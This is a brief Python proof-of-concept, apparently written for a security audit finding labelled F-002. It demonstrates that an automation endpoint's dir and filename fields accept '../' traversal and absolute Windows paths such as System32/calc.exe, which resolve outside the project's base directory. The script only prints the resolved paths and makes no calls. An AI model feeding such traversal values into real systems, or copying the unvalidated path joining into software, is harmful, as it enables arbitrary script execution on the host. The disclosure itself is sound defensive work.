"""
PoC for F-002: Arbitrary script execution via unsanitized dir and filename in /api/automation/add.
Demonstrates that pathlib resolution permits path traversal escaping BASE_DIR.
"""
import sys
from pathlib import Path

BASE = Path(__file__).resolve().parent.parent.parent.parent
sys.path.insert(0, str(BASE))

from utils.config import BASE_DIR
from models.report import Report

def test_traversal():
    # 1. Traversal using ..
    r_traversal = Report(
        name="Malicious_Traversal",
        filename="outside_script.py",
        filetype="python",
        dir="../../arbitrary/directory",
        status="Waiting"
    )

    script_dir = BASE_DIR / r_traversal.dir
    script_path = script_dir / r_traversal.filename

    resolved_path = script_path.resolve()
    print(f"BASE_DIR: {BASE_DIR}")
    print(f"Traversed script_path resolved: {resolved_path}")
    print(f"Is outside BASE_DIR: {not str(resolved_path).startswith(str(BASE_DIR))}")

    # 2. Absolute path injection
    r_absolute = Report(
        name="Malicious_Absolute",
        filename="C:/Windows/System32/calc.exe",
        filetype="python",
        dir="C:/Windows/System32",
        status="Waiting"
    )
    script_abs = (BASE_DIR / r_absolute.dir) / r_absolute.filename
    print(f"Absolute script_abs resolved: {script_abs}")

    assert not str(resolved_path).startswith(str(BASE_DIR)), "Should resolve outside BASE_DIR"
    print("[+] CONFIRMED F-002: Arbitrary paths escape project boundaries without validation!")

if __name__ == "__main__":
    test_traversal()

